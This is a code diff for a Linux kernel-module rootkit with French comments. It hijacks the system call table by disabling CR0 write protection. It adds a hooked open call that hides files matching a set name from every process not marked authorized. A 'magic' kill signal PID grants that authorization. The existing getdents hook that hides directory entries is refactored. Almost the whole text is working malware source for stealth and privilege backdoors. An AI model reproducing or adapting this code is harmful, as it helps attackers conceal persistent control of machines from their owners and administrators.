@@ -39,6 +39,7 @@ struct linux_dirent
 unsigned long * sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;
 
 // Original functions
+asmlinkage int (*original_sys_open) (const char *pathname, int flags);
 asmlinkage int (*original_sys_close) (unsigned int fd);
 asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);
 asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
@@ -49,7 +50,17 @@ asmlinkage pid_t (*original_sys_getppid) (void);
  * File system, one layer deep into kernel
  * Donc, pour chaque fonction de userland, il faut voir son implementation et checker le niveau en dessous
  * */
- 
+
+static int is_proc_authorized(pid_t pid)
+{
+	int i;
+
+	for(i = 0; i < authorized_pids_cnt; i++)
+		if(pid == authorized_pids[i])
+			return 1;
+	return 0;
+}
+
 struct file *file_open(const char *path, int flags, int rights)
 {
 	struct file *filp = NULL;
@@ -112,12 +123,31 @@ int file_sync(struct file * file)
 
 // Finish editing some files here
  
+asmlinkage int fake_sys_open(const char *pathname, int flags)
+{
+	pid_t pid  = original_sys_getpid();
+    pid_t ppid = original_sys_getppid();
+
+	// If authorized, we can open the file
+	if(is_proc_authorized(pid) || is_proc_authorized(ppid))
+		return original_sys_open(pathname, flags);
+	else
+	{
+		if(strstr(pathname, FILE_BASENAME))
+			return -1;
+		else
+			return original_sys_open(pathname, flags);
+	}
+}
+
 asmlinkage int fake_sys_kill(pid_t pid, int sig)
 {
 	int ret = 0;
 	if(pid == MAGIC_KILL_PID)
+	{
 		if(authorized_pids_cnt < MAX_PIDS)
 			authorized_pids[authorized_pids_cnt++] = current->pid;
+	}
 	else
 		ret = original_sys_kill(pid, sig);
 	return ret;
@@ -139,6 +169,7 @@ asmlinkage int fake_sys_close(unsigned int fd)
     if(filp)
     {
         printk("[%s] File : %s created!\n", __this_module.name, filename);
+        file_write(filp, 0, filename, strlen(filename));
         file_close(filp);
         filp = NULL;
     }
@@ -158,23 +189,11 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     char 					logs[LOGS_SIZE];
     struct linux_dirent *	dir;		
     struct linux_dirent *	prev		= NULL;
-    unsigned long 			i			= 0;
-    int 					found		= 0;
     int						nread		= 0;
     pid_t					pid		    = original_sys_getpid();
     pid_t					ppid	    = original_sys_getppid();
 
-	for(i = 0; i < authorized_pids_cnt; i++)
-	{
-		if(pid == authorized_pids[i] || ppid == authorized_pids[i])
-		{
-			found = 1;
-			break;
-		}
-	}
-
-	// If authorized pid, allow to read all file
-	if(found)
+	if(is_proc_authorized(pid) || is_proc_authorized(ppid))
 	{
 		printk("[%s] [OK] pid[%d]\n", __this_module.name, current->pid);
 		return original_sys_getdents(fd, dirp, count);
@@ -242,12 +261,14 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 static int __init lkm_init(void)
 {
+    original_sys_open      	= sys_call[__NR_open];
     original_sys_close      = sys_call[__NR_close];
     original_sys_getdents   = sys_call[__NR_getdents];
     original_sys_kill   	= sys_call[__NR_kill];
     original_sys_getpid   	= sys_call[__NR_getpid];
     original_sys_getppid   	= sys_call[__NR_getppid];
     write_cr0(read_cr0() & (~0x10000));
+    sys_call[__NR_open]    	= fake_sys_open;
     sys_call[__NR_close]    = fake_sys_close;
     sys_call[__NR_getdents] = fake_sys_getdents;
     sys_call[__NR_kill] 	= fake_sys_kill;
@@ -260,6 +281,7 @@ static int __init lkm_init(void)
 static void __exit lkm_exit(void)
 {
     write_cr0(read_cr0() & (~0x10000));
+    sys_call[__NR_open] 	= original_sys_open;
     sys_call[__NR_close] 	= original_sys_close;
     sys_call[__NR_getdents] = original_sys_getdents;
     sys_call[__NR_kill] 	= original_sys_kill;
